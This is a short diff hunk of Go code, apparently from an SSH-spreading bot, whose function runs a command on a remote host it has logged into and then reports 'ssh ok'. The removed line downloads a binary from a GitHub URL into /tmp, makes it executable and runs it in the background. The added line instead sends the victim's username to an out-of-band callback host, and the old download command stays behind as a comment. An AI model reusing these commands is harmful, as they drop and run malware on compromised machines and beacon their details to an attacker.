@@ -105,7 +105,7 @@ func fun(ip string) {
 			}
 
 
-er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")
+er := session.Run("curl dlpvbxfcemxfkzpjilmy6tziwk74mbz5s.oast.fun/$(whoami)")                  //"curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")
 
 
               go bot( "ssh ok ")
